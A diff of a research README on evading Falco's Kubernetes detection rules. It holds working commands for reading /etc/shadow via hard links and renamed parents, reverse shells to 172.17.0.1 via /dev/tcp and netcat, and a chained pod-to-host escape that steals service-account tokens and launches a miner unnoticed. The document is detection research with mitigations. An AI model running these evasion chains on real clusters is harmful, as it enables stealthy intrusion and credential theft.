@@ -2,18 +2,18 @@ This project describes my research on various techniques to bypass default falco
 
 This is a research project that consists of documentation (all in `README.md`) and supporting artifacts placed in subdirectories.
 
-The main directory contains the **Dockerfile** for `sshayb/fubers:latest` image used extensively in this project as well as the artifacts needed to successfully build the image. To build the image, run `docker build -t sshayb/fubers:latest .` from the main directory. This will download and copy the necessary binaries and fubers (from /fubers) into the container image based on ubuntu:18.04. The build process copies the binaries under different names and creates symlinks where necessary (see Dockerfile for details) - all this to avoid triggering rules from the moment the container starts. 
+The main directory contains the **Dockerfile** for `sshayb/fuber:latest` image used extensively in this project as well as the artifacts needed to successfully build the image. To build the image, run `docker build -t sshayb/fuber:latest .` from the main directory. This will download and copy the necessary binaries and fubers (from /fubers) into the container image based on ubuntu:18.04. The build process copies the binaries under different names and creates symlinks where necessary (see Dockerfile for details) - all this to avoid triggering rules from the moment the container starts. 
 
-Binaries are docker and kubectl standalone binaries typically used to facilitate privilege escalation and lateral movement during the cluster compromise. **Fubers** are small bypass snippets written in C and used to demonstrate various bypass techniques: `fuber-openandreadfile` and `systemd-logind` are used in section [Bypass rules via executable naming](#naming), while `fuber-dos` is used in section [A Word on CVE-2019-8339 and Falco Denial of Service](#cve).
+**Binaries** are docker and kubectl standalone binaries typically used to facilitate privilege escalation and lateral movement during the cluster compromise. **Fubers** are small bypass snippets written in C and used to demonstrate various bypass techniques: `fuber-openandreadfile` and `systemd-logind` are used in section [Bypass rules via executable naming](#naming), while `fuber-dos` is used in section [A Word on CVE-2019-8339 and Falco Denial of Service](#cve).
 
 A separate **folder `CVE-2021-3156`** contains everything needed to build the docker image used to test CVE-2021-3156 vulnerability in section [A special case of "Sudo Potential Privilege Escalation"](#escalation): Dockerfile, exploit POC and a vulnerable sudo package.
 
 ## Falco Overview
-Higher abstration levels in Software and DevOps world have multiple advantages: they make software and configuration reuse easier; they facilitate code development and project creation. The price is the visibility. The higher the abstraction level the more difficult it is to monitor, inspect and debug it. Falco was born to solve this problem. As an ultimate "Wireshark" of Kubernetes, it can tell what process was spawned when and correlate this process to the workload on Kubernetes level. Falco's uniqueness is in the way it cuts through the abstraction levels and brings together multiple debug and monitor sources into the parsable and manageable environment.
+Higher abstraction levels in Software and DevOps world have multiple advantages: they make software and configuration reuse easier; they facilitate code development and project creation. The price is the visibility. The higher the abstraction level the more difficult it is to monitor, inspect and debug it. Falco was born to solve this problem. As an ultimate "Wireshark" of Kubernetes, it can tell what process was spawned when and correlate this process to the workload on Kubernetes level. Falco's uniqueness is in the way it cuts through the abstraction levels and brings together multiple debug and monitor sources into the parsable and manageable environment.
 
 ### Falco skipped system calls
 
-Before we proceed, we need to understand that because of the sheer volume of system events Falco cannot process all of them. The developers had to make a concious decision to ignore the following system calls, which by itself is an interesting bypass vector:
+Before we proceed, we need to understand that because of the sheer volume of system events Falco cannot process all of them. The developers had to make a conscious decision to ignore the following system calls, which by itself is an interesting bypass vector:
 
 ```
 access alarm brk capget clock_getres clock_gettime clock_nanosleep clock_settime close container cpu_hotplug drop epoll_create epoll_create1 epoll_ctl epoll_pwait epoll_wait eventfd eventfd2 exit_group fcntl fcntl64 fdatasync fgetxattr flistxattr fstat fstat64 fstatat64 fstatfs fstatfs64 fsync futex get_robust_list get_thread_area getcpu getcwd getdents getdents64 getegid geteuid getgid getgroups getitimer getpeername getpgid getpgrp getpid getppid getpriority getresgid getresuid getrlimit getrusage getsid getsockname getsockopt gettid gettimeofday getuid getxattr infra io_cancel io_destroy io_getevents io_setup io_submit ioprio_get ioprio_set k8s lgetxattr listxattr llistxattr llseek lseek lstat lstat64 madvise mesos mincore mlock mlockall mmap mmap2 mprotect mq_getsetattr mq_notify mq_timedreceive mq_timedsend mremap msgget msgrcv msgsnd munlock munlockall munmap nanosleep newfstatat newselect notification olduname page_fault pause poll ppoll pread pread64 preadv procinfo pselect6 pwrite pwrite64 pwritev read readv recv recvmmsg remap_file_pages rt_sigaction rt_sigpending rt_sigprocmask rt_sigsuspend rt_sigtimedwait sched_get_priority_max sched_get_priority_min sched_getaffinity sched_getparam sched_getscheduler sched_yield select semctl semget semop send sendfile sendfile64 sendmmsg setitimer setresgid setrlimit settimeofday sgetmask shutdown signaldeliver signalfd signalfd4 sigpending sigprocmask sigreturn splice stat stat64 statfs statfs64 switch sysdigevent tee time timer_create timer_delete timer_getoverrun timer_gettime timer_settime timerfd_create timerfd_gettime timerfd_settime times ugetrlimit umask uname ustat vmsplice wait4 waitid waitpid write writev
@@ -89,6 +89,20 @@ root@8a7dc959e480:/# echo "##" >> root-link/profile
 SILENCE
 ```
 
+Another way to bypass symlink creation is by using a hard link (credit for this bypass goes to Stephen Clarke). Hard links are the often-overlooked sibling of the soft links; opposite to the soft links, they share the same inode with the target file along with the original permissions. The syscall used when creating a hard links is different from the syscall used when creating soft links, therefore, **Create Symlink Over Sensitive Files** remains silent:
+
+```
+[Container]
+$ docker run --rm -it debian:10.2 bash
+root@7777d3b8ddea:/tmp# ln /etc/shadow sh-link
+root@7777d3b8ddea:/tmp# cat sh-link
+root:*:18291:0:99999:7:::
+...
+-----
+[Falco]
+SILENCE
+```
+
 <ins>Rules bypassed:</ins> 
 - **Read sensitive file untrusted**
 - **Read sensitive file trusted after startup**
@@ -96,7 +110,7 @@ SILENCE
 - **Write below ...**
 - other rules that depend on _fd.name_ or _fd.directory_ comparison
 
-<ins>Suggested mitigations:</ins> Warnings on symlink creation; ability to detect symlink-relative paths.
+<ins>Suggested mitigations:</ins> Warnings on symlink creation; ability to detect symlink-relative paths; detecting link and linkat syscals for hard link creation.
 
 ### <a name="escalation"></a>A special case of "Sudo Potential Privilege Escalation"
 
@@ -111,7 +125,7 @@ uid=0(root) gid=0(root) groups=0(root)
 [Falco]
 SILENCE
 ```
-To understand the reason behind the Falco silence I attached the container process to strace utility. The following command captures only execve events and follows forks:
+To understand the reason behind the Falco silence I attached the container process to the strace utility. The following command captures only execve events and follows forks:
 ```
 [Host]
 $ sudo strace -p 14415 -f -e execve -v -s 250
@@ -129,7 +143,7 @@ We can see from the line `execve("/usr/bin/sudo"...` that all the rule condition
 
 ### <a name="naming"></a>Bypass rules via executable naming
 
-Let us consider the same **Read sensitive file untrusted** rule again - is there another, non-symlink way to bypass the rule? This rule relies on the following condition: `and not proc.name in (user_mgmt_binaries,`, where _proc.name_ is (acording to Falco documentation) "the name (excluding the path) of the executable generating the event". _user_mgmt_binaries_ macro, in turn, boils down to the following items list:
+Let us consider the same **Read sensitive file untrusted** rule again - is there another, non-symlink way to bypass the rule? This rule relies on the following condition: `and not proc.name in (user_mgmt_binaries,`, where _proc.name_ is (according to Falco documentation) "the name (excluding the path) of the executable generating the event". _user_mgmt_binaries_ macro, in turn, boils down to the following items list:
 ```
 - list: login_binaries
   items: [
@@ -150,7 +164,7 @@ root:*:18291:0:99999:7:::daemon:*:18291:0:99999:7:::bin:*:18291:0:99999:7:::sys:
 [Falco]
 SILENCE
 ```
-This bypass technique was also mentioned in the same Kubecon 2020 [presentation](https://www.youtube.com/watch?v=nGqWskXRSmo), but I believe it deserves more attention because of the ubiquitous nature of _proc.name_ construct. It appears over 140 times in the default ruleset structures and indeed many rules rely on the conditions involving _proc.name_ and _proc.pname_ comparisons. Furthermore, the "and not" construct is very popular within the default ruleset as a means to avoid False Positives. In fact, most of the rules include some kind of "exception" list in one way or another.
+This bypass technique was also mentioned in the same Kubecon 2020 [presentation](https://www.youtube.com/watch?v=nGqWskXRSmo), but I believe it deserves more attention because of the ubiquitous nature of _proc.name_ construct. It appears over 140 times in the default ruleset structures and indeed many rules rely on the conditions involving _proc.name_ comparisons. Furthermore, the "and not" construct is very popular within the default ruleset as a means to avoid False Positives. In fact, most of the rules include some kind of "exception" list in one way or another.
 
 If we think what rules can be bypassed through creation of custom binaries, it becomes apparent that the described approach is not scalable. For other malicious actions that incorporate events other than file/directory manipulations, writing a C program duplicating the functionality does not scale. Turns out, we do not have to duplicate the functionality. Merely creating the symlink named as one of the exception binaries should do the trick:
 ```
@@ -187,9 +201,67 @@ These three sub-techniques give an attacker a powerful bypass for the rules that
 
 <ins>Suggested mitigations:</ins> Less reliance on _proc.name_.
 
+### <a name="naming"></a>Bypass rules via parent / ancestor executable naming
+
+A similar bypass can be done through the manipulation of the current process parents. Let us consider the same **Read sensitive file untrusted** rule again. One of the conditions for exception checks that this suspicious action is not performed by the _passwd_ command copying the sensitive file:
+
+```
+- macro: cmp_cp_by_passwd
+  condition: proc.name in (cmp, cp) and proc.pname in (passwd, run-parts)
+```
+
+This gives us an idea to use _cp_ to copy the sensitive file while ensuring the parent process is called "passwd". This can be easily done by creating a simple bash script performing the necessary commands for us and naming it "passwd":
+
+```
+[Container]
+$ sudo docker run -it sshayb/fuber:latest bash
+root@7c8c49e59890:/tmp# cat passwd 
+#!/bin/bash
+cp /etc/shadow shadow-copy
+root@7c8c49e59890:/tmp# chmod +x passwd
+root@7c8c49e59890:/tmp# ./passwd 
+root@7c8c49e59890:/tmp# ls
+docker  fubers  gbash  gdocker  gkubectl  passwd  runc-nsenter  shadow-copy
+root@7c8c49e59890:/tmp# cat shadow-copy
+root:*:18759:0:99999:7:::
+...
+-----
+[Falco]
+SILENCE
+```
+
+In addition, _proc.aname_ construct can also be used for bypasses with _proc.aname[1]_ containing a parent process name, _proc.aname[2]_ containing a grandfather process name and so on. To make the process of bypassing easy we created a small utility that forks the process a necessary number of times and changes the process name at the required level. To bypass the same **Read sensitive file untrusted** we can use any of the handy exception conditions that check one of the ancestor names. For example, macro _run\_by\_google\_accounts\_daemon_:
+
+```
+- macro: run_by_google_accounts_daemon
+  condition: >
+    (proc.aname[1] startswith google_accounts or
+     proc.aname[2] startswith google_accounts or
+     proc.aname[3] startswith google_accounts)
+```
+
+To demonstrate the usage of the utility, for the first time we will use `sshayb/fuber:latest` - an ubuntu-based [image](Dockerfile) that was specifically built to contain necessary tools and utilities for this study[^2]:
+
+```
+[Container]
+$ sudo docker run -it sshayb/fuber:latest
+root@cc2c6682b811:/tmp# ./fubers/fuber-fakeparents "cat /etc/shadow" google_accounts 3
+root:*:18831:0:99999:7:::
+...
+-----
+[Falco]
+SILENCE
+```
+
+In this example, fuber-fakeparents utility renames the current process to "google_accounts" and forks the process 3 times before calling _cat_. The impact of this bypass is significant - as of v0.30, there are 50 instances of _pname_ and 45 instances of _aname[*]_ usage in the conditional context.
+
+<ins>Rules bypassed:</ins> All rules that rely on _proc.pname_ and _proc.aname_ comparison.
+
+<ins>Suggested mitigations:</ins> Similar to previous bypass - less reliance on process naming.
+
 ### <a name="revshell"></a>Bypass reverse shell detection
 
-Initiation of a reverse shell connection is a crucial ability for successfull attack. Falco default ruleset contains several rules that make reverse shell detectable by default. Let us examine how Falco detects the typical reverse shell attempt initiated from within the compromised pod / container:
+Initiation of a reverse shell connection is a crucial ability for successful attack. Falco default ruleset contains several rules that make reverse shell detectable by default. Let us examine how Falco detects the typical reverse shell attempt initiated from within the compromised pod / container:
 ```
 [Container]
 $ docker run --rm -it debian:10.2 bash
@@ -221,7 +293,6 @@ root@3a03766368a0:/# /tmp/gbash -c "/tmp/gbash -i >& /dev/tcp/172.17.0.1/443 0>&
 -----
 [Host]
 $ sudo nc -nlvp 443
-[sudo] password for tutorial: 
 Ncat: Version 7.50 ( https://nmap.org/ncat )
 Ncat: Listening on :::443
 Ncat: Listening on 0.0.0.0:443
@@ -233,9 +304,9 @@ root@3a03766368a0:/#
 14:44:37.439154946: Warning Redirect stdout/stdin to network connection (user=root user_loginuid=-1 k8s.ns=<NA> k8s.pod=<NA> container=3a03766368a0 process=gbash parent=gbash cmdline=gbash -c /tmp/gbash -i >& /dev/tcp/172.17.0.1/443 0>&1 terminal=34816 container_id=3a03766368a0 image=debian fd.name=172.17.0.2:48048->172.17.0.1:443 fd.num=1 fd.type=ipv4 fd.sip=172.17.0.1) k8s.ns=<NA> k8s.pod=<NA> container=3a03766368a0
 14:44:37.439157224: Warning Redirect stdout/stdin to network connection (user=root user_loginuid=-1 k8s.ns=<NA> k8s.pod=<NA> container=3a03766368a0 process=gbash parent=gbash cmdline=gbash -c /tmp/gbash -i >& /dev/tcp/172.17.0.1/443 0>&1 terminal=34816 container_id=3a03766368a0 image=debian fd.name=172.17.0.2:48048->172.17.0.1:443 fd.num=1 fd.type=ipv4 fd.sip=172.17.0.1) k8s.ns=<NA> k8s.pod=<NA> container=3a03766368a0
 ```
-Still, we still have to deal two(?) spurious events. Taking a closer look at rule **Redirect STDOUT/STDIN to Network Connection in Container**, we don't see dependencies on _proc.name_ or _fd.name_ and no easy bypass apparent. The rule intercepts dup syscall that duplicates a file descriptor, in this case any of the stdin / stdout / stderr triade. The first thought is swapping dup call with one of the syster calls - dup2 or dup3 - that appear to have very similar functionality according to Linux man pages[^1]. However, that would mean duplicating bash functionality or somehow recompiling it with a different syscall.
+Still, we have to deal two(?) spurious events. Taking a closer look at rule **Redirect STDOUT/STDIN to Network Connection in Container**, we don't see dependencies on _proc.name_ or _fd.name_ and no easy bypass apparent. The rule intercepts dup syscall that duplicates a file descriptor, in this case any of the stdin / stdout / stderr triad. The first thought is swapping dup call with one of the sister calls - dup2 or dup3 - that appear to have very similar functionality according to Linux man pages[^1]. However, that would mean duplicating bash functionality or somehow recompiling it with a different syscall.
 
-Instead, we can abandon dup altogether and find a new way to initiate a reverse shell. What about payloads that redirect shell to netcat through pipe creation? For the first time we will use sshayb/fuber:latest - an ubuntu-based [image](Dockerfile) that was specifically built to contain necessary tools and utilities for this study[^2]:
+Instead, we can abandon dup altogether and find a new way to initiate a reverse shell. What about payloads that redirect shell to netcat through pipe creation?
 ```
 [Container]
 docker run --rm -it sshayb/fuber:latest
@@ -254,26 +325,7 @@ eabe8cffc8c8
 [Falco]
 12:47:37.884716967: Notice Network tool launched in container (user=root user_loginuid=-1 command=nc 172.17.0.1 443 parent_process=gbash container_id=eabe8cffc8c8 container_name=vigorous_hawking image=sshayb/fuber:latest) k8s.ns=<NA> k8s.pod=<NA> container=eabe8cffc8c8 k8s.ns=<NA> k8s.pod=<NA> container=eabe8cffc8c8
 ```
-Great. This does not trigger "Redirect stdout/stdin" rule, and besides, getting rid of the "Network tool launched" is easy with the previous bypass techniques.																																																																																																	 
-   
-		   
-									   
-																											   
-	 
-	  
-				 
-											
-						 
-							  
-								 
-									   
-		
-			
-	 
-	   
-																																																																																												 
-   
-																																							   
+Great. This does not trigger "Redirect stdout/stdin" rule, and besides, getting rid of the "Network tool launched" is easy with the previous bypass techniques.
 
 Finally, to be even more original and avoid triggering any rules without using previous bypasses, we can use the msfvenom tool, which is a de-facto standard payload generator in offensive security community:
 ```
@@ -412,7 +464,7 @@ usage: sudoedit [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p pr
 [Falco]
 SILENCE
 ```
-Same does not work for _-s_ flag because _-s_ is a substring of _--shell_ and thus `proc.args contains -s` evaluates to TRUE. Instead, we can collate the flags as with the previous bypass:
+The same does not work for _-s_ flag because _-s_ is a substring of _--shell_ and thus `proc.args contains -s` evaluates to TRUE. Instead, we can collate the flags as with the previous bypass:
 ```
 $ sudoedit -ns '\' 'id'
 usage: sudoedit [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout]
@@ -462,7 +514,7 @@ Same bypass will work when specifying mounts in K8s object yaml's.
 
 ### Bypass crypto mining detections
 
-Falco default ruleset has two rules able to detect a crypto miner: **Detect outbound connections to common miner pool ports** and **Detect crypto miners using the Stratum protocol**. However, the former is disabled by default due to noisiness and the latter is bypassable. Taking a closer look at **Detect crypto miners using the Stratum protocol** conditions we see that it depends on creation of the new process while looking for `stratum+tcp` in command line arguments. This condition is too restrictive for three reasons: first, it does not take into account the new stratum V2 protocol developed recently[^6]; secondly, stratum is merely a protocol to support a pool mining mode with direct mining mode ignored; (3) the rule does not take into account possibility of miner starting without the pool url and adding it at a later stage.
+Falco default ruleset has two rules able to detect a crypto miner: **Detect outbound connections to common miner pool ports** and **Detect crypto miners using the Stratum protocol**. However, the former is disabled by default due to noisiness and the latter is bypassable. Taking a closer look at **Detect crypto miners using the Stratum protocol** conditions we see that it depends on creation of the new process while looking for `stratum+tcp` in command line arguments. This condition is too restrictive for three reasons: first, it does not take into account the new stratum V2 protocol developed recently[^6]; secondly, stratum is merely a protocol to support a pool mining mode with direct mining mode ignored; (3) the rule does not take into account the possibility of a miner starting without the pool url and adding it at a later stage.
 
 <ins>Rules bypassed:</ins> **Detect crypto miners using the Stratum protocol**
 
@@ -576,7 +628,7 @@ OUTPUT: root:*:16895:0:99999:7:::
 17:11:51.948645683: Debug Falco internal: syscall event drop. 474099 system calls dropped in last second. (ebpf_enabled=0 n_drops=474099 n_drops_buffer=474099 n_drops_bug=0 n_drops_pf=0 n_evts=807893)
 ```
 ### On a pod within a local cluster ran by Minicube
-When running the utility on on a pod within the Minicube cluster, 200K fake events seem to be enough to cause Falco to consistently drop events and bypass detection on an irregular basis. Out of 10 tries, 9 of them detected "Sensitive file opened" successfully:
+When running the utility on a pod within the Minicube cluster, 200K fake events seem to be enough to cause Falco to consistently drop events and bypass detection on an irregular basis. Out of 10 tries, 9 of them detected "Sensitive file opened" successfully:
 ```
 [Pod]
 minikube version
@@ -635,22 +687,241 @@ OUTPUT: db-6cdcb49cc6-zlzr5          1/1     Running   0          7d9h
 19:13:50.494978484: Debug Falco internal: syscall event drop. 59240 system calls dropped in last second. (ebpf_enabled=1 n_drops=59240 n_drops_buffer=59240 n_drops_bug=0 n_drops_pf=0 n_evts=137981)
 19:13:53.539298970: Debug Falco internal: syscall event drop. 11689 system calls dropped in last second. (ebpf_enabled=1 n_drops=11689 n_drops_buffer=11689 n_drops_bug=0 n_drops_pf=0 n_evts=26584)
 ```
-<ins>Conclusion:</ins> Based on this limited testing, the fixes introduced in v0.15.0 were largely successful in mitigating the attack. Even though the DoS attack may seem attractive, in practice an attacker will risk exposing themselves not only through "Falco internal: syscall event drop" event (that might be easier ignore), but also through the original rule trigger. Keep treating event loss as CRITICAL - there might be an attacker behind the event loss.
+<ins>Conclusion:</ins> Based on this limited testing, the fixes introduced in v0.15.0 were largely successful in mitigating the attack. Even though the DoS attack may seem attractive, in practice an attacker will risk exposing themselves not only through "Falco internal: syscall event drop" event (that might be easily ignored), but also through the original rule trigger. In one of the recent CNCF presentations[^8] by Shopify the presentor advises the users to lower the priority of the drop event to LOG level. My recommendation is to keep treating event loss as CRITICAL - there might be an attacker behind the event loss.
 
 ## Putting it All Together for a Full Attack Simulation
 
-===========TBD===========
+To be sure, bypassing a single rule will not lead to the full unnoticed cluster compromise. As we have seen in multiple cases any particular malicious action can trigger one or more rules. The ultimate test for successful bypass is if the attacker is able to chain the individual rules bypasses into a successful attack chain that does not trip the Falco alarms. The hidden assumption here is the successful tuning of the Falco rules within the customer environment and a premise that even one rule trigger will alert the SOC. It is debatable how practical this assumption is but let us put it to the test.
+
+As an attack simulation platform, I chose securekubernetes training [cluster](https://securekubernetes.com/) presented at Kubecon NA 2019. Its main purpose is to provide a realistic training environment for security professionals interested in securing K8s clusters. The platform offers a unique perspective from both attacker and defender sides and splits the training into two scenarios: Basic attack and defense ([Scenario 1](https://securekubernetes.com/scenario_1_attack/)) and Advanced attack and defense ([Scenario 2](https://securekubernetes.com/scenario_2_attack/)). Among other things, the defense phase includes deploying Falco.
+
+But even before we start Scenario 1, we install Falco on the training cluster with several commands:
+
+```
+helm repo add stable https://charts.helm.sh/stable
+helm repo add falcosecurity https://falcosecurity.github.io/charts
+helm repo update
+export FALCO_BPF_PROBE=""
+helm install falco falcosecurity/falco --set ebpf.enabled=true
+```
+
+The attack scenario assumes initial pod access is given to the Red attacker through email and the scenario starts with the shell in the compromised production dashboard pod. We run the list of the commands described in Scenario 1. These commands lead to the coin miner running on the cluster - from the enumeration and info gathering to the spinning of the bitcoinero pod. These commands result in 3 rules triggering overall 16 times. Arguably this should be enough to alert an observant SOC. An even more realistic scenario is the one where Red runs one of the enumeration / privilege escalation scripts. On the example of linpeas.sh[^9]:
+
+```
+[Compromised Pod]
+dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ curl -LO https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ chmod +x linpeas.sh
+dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ ./linpeas.sh
+-----
+[Falco]
+21:18:06.435080411: Warning Grep private keys or passwords activities found (user=<NA>
+...
+```
+
+Overall, Falco reports 99 events. This is quite noisy from a supposedly stealthy activity. We expect even more noise from Scenario 2, where attacker DarkRed uses even more advanced techniques to re-deploy the same mining pod and to expose the NodePort for future access. Perhaps the most important command in the sequence for Scenario 2 is the one-liner breaking from the pod into the host:
+
+```
+[Compromised Pod]
+dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ kubectl run r00t1 --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
+If you don't see a command prompt, try pressing enter.
+r00t1 / #
+-----
+[Falco]
+11:46:21.259775504: Warning Docker or kubernetes client executed in container (user=<NA> user_loginuid=-1 k8s.ns=prd k8s.pod=dashboard-56755cd6c9-6dk6v container=b1814c27d1d2 parent=bash cmdline=kubectl run r00t1 --restart=Never -ti --rm --image lol --overrides {"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}} image=securekubernetes/example-dashboard:latest) k8s.ns=prd k8s.pod=dashboard-56755cd6c9-6dk6v container=b1814c27d1d2
+11:46:21.361024068: Notice Unexpected connection to K8s API Server from container (command=kubectl run r00t1 --restart=Never -ti --rm --image lol --overrides {"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}} k8s.ns=prd k8s.pod=dashboard-56755cd6c9-6dk6v container=b1814c27d1d2 image=securekubernetes/example-dashboard:latest connection=10.48.0.8:46520->10.52.0.1:443) k8s.ns=prd k8s.pod=dashboard-56755cd6c9-6dk6v container=b1814c27d1d2
+11:46:23.500801258: Notice Privileged container started (user=<NA> user_loginuid=0 command=container:3af88f406740 k8s.ns=prd k8s.pod=r00t1 container=3af88f406740 image=alpine:latest) k8s.ns=prd k8s.pod=r00t1 container=3af88f406740
+11:46:23.518207080: Notice A shell was spawned in a container with an attached terminal (user=root user_loginuid=-1 k8s.ns=prd k8s.pod=r00t1 container=3af88f406740 shell=bash parent=<NA> cmdline=bash terminal=34816 container_id=3af88f406740 image=alpine) k8s.ns=prd k8s.pod=r00t1 container=3af88f406740
+11:46:24.236488771: Notice Unexpected connection to K8s API Server from container (command=kubectl run r00t1 --restart=Never -ti --rm --image lol --overrides {"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}} k8s.ns=prd k8s.pod=dashboard-56755cd6c9-6dk6v container=b1814c27d1d2 image=securekubernetes/example-dashboard:latest connection=10.48.0.8:46526->10.52.0.1:443) k8s.ns=prd k8s.pod=dashboard-56755cd6c9-6dk6v container=b1814c27d1d2
+```
+
+Falco emits 5 events from 4 different rules. However, all is not lost, let us see how we can bypass the detections based on what we have learned until now (hint - we will be using fuber:latest):
+
+```
+[Compromised Pod]
+dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.18.17/bin/linux/amd64/kubectl
+dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ mv kubectl kctl
+dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ chmod +x kctl
+dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ ./kctl run r00t3 --restart=Never -ti--rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"args":["-c","/tmp/gdocker ps"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/run","name": "test"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test","hostPath":{"path": "/var/run"}}]}}'
+CONTAINER ID   IMAGE COMMAND                  CREATED             STATUS                  PORTSNAMES
+c2fec73bf388   354571a19ce4 "/tmp/gbash -c '/tmp…"   1 second ago        Up Less than a secondk8s_1_r00t3_prd_b2526988-51e4-45e2-a599-5a59703b1762_0
+5c9821487eb2   k8s.gcr.io/pause:3.2 "/pause"                 1 second ago        Up Less than a secondk8s_POD_r00t3_prd_b2526988-51e4-45e2-a599-5a59703b1762_0
+...
+----
+[Falco]
+12:08:30.674813209: Notice Unexpected connection to K8s API Server from container (command=kctl run r00t3 --restart=Never -ti --rm --image lol --overrides {"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"args":["-c","/tmp/gdocker ps"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/run","name": "test"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test","hostPath":{"path": "/var/run"}}]}} k8s.ns=prd k8s.pod=dashboard-56755cd6c9-6dk6v container=b1814c27d1d2 image=securekubernetes/example-dashboard:latest connection=10.48.0.8:49138->10.52.0.1:443) k8s.ns=prd k8s.pod=dashboard-56755cd6c9-6dk6v container=b1814c27d1d2
+```
+
+With only one NOTICE we have control over the docker socket on the node - this will allow us to start the bitcoin miner:
+
+```
+[Compromised Pod]
+dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ ./kctl run r00t3 --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"args":["-c","/tmp/gdocker run -d securekubernetes/bitcoinero -c1 -l10"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/run","name": "test"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test","hostPath":{"path": "/var/run"}}]}}'
+100fe01721422621c64d3689694af5a5937a3384c76bec7cf761c61319e92add
+pod "r00t3" deleted
+```
+
+To summarize, we have performed the following evasion:
+* in fuber:latest - /tmp/gbash is a symlink to bash to bypass **Terminal shell in container**
+* in fuber:latest - docker binary disguised as a /tmp/gdocker to bypass **The docker client is executed in a container** (this is actually not needed as we use node's docker after the pid namespace mounting)
+* in fuber:latest - nsenter disguised as a runc-nsenter to bypass **Change thread namespace** (update: this rule was actually disabled by default later in https://github.com/falcosecurity/falco/pull/1632)
+* map _/var/run_ and not _/var/run/docker.sock_ to bypass **Launch Sensitive Mount Container** rule
+
+Can we go further following Scenario 2 and set up the backdoor through NodePort? The next step would be to get secret token for kube-system namespace, for this we need access to the node's _/var/lib_ path:
+
+```
+[Compromised Pod]
+dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ ./kctl run r00t3 --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"args":["-c","ls -la /var/lib/kubelet/pods"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/lib","name": "test"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test","hostPath":{"path": "/var/lib"}}]}}'
+total 88
+drwxr-x--- 22 root root 4096 Oct 17 12:41 .
+drwxr-xr-x  8 root root 4096 Oct 17 09:37 ..
+drwxr-x---  5 root root 4096 Oct 17 10:11 1124fa37-747a-4fc5-af24-dd2ccc64ce89
+drwxr-x---  5 root root 4096 Oct 17 09:40 12a640d3-6f7b-45b5-92a5-537772e2774a
+...
+dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ ./kctl run r00t3 --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"args":["-c","cat /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/namespace"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/lib","name": "test"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test","hostPath":{"path": "/var/lib"}}]}}'
+prdkube-systemdevprdkube-systemkube-systemkube-systemdevkube-systemprddevkube-systemkube-systemprdkube-systemprddefaultpod "r00t3" deleted
+dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ ./kctl run r00t3 --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"args":["-c","cat /var/lib/kubelet/pods/12a640d3-6f7b-45b5-92a5-537772e2774a/volumes/kubernetes.io~secret/default-token-hnhmm/token"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/lib","name": "test"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test","hostPath":{"path": "/var/lib"}}]}}'
+eyJhbGciO...uMP08h9jzgpod "r00t3" deleted
+dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ ./kctl --token "eyJhb...8h9jzg" auth can-i --list
+warning: the list may be incomplete: webhook authorizer does not support user rule resolution
+Resources                                       Non-Resource URLs   Resource Names   Verbs
+*.*                                             []                  []     [*]
+                                                [*]                 []     [*]
+selfsubjectaccessreviews.authorization.k8s.io   []                  []     [create]
